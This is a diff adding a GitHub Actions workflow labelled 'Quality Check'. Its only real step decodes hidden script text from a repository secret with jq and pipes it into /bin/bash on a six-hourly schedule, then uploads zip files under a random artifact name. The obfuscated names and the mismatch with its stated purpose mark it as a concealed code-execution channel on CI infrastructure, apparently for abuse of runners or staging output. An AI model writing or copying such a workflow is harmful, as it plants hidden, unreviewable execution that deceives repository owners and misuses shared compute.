@@ -1,0 +1,30 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '43 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          zeo1: ${{ secrets.zeo1 }}
+        run: |
+          printf '%s' "$zeo1" | jq -r .yniyn9 | /bin/bash
+          printf '%s' "$fpa14" | jq -r .ts50543 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 4tDfzZiV
+          path: "*.zip"
+          retention-days: 1
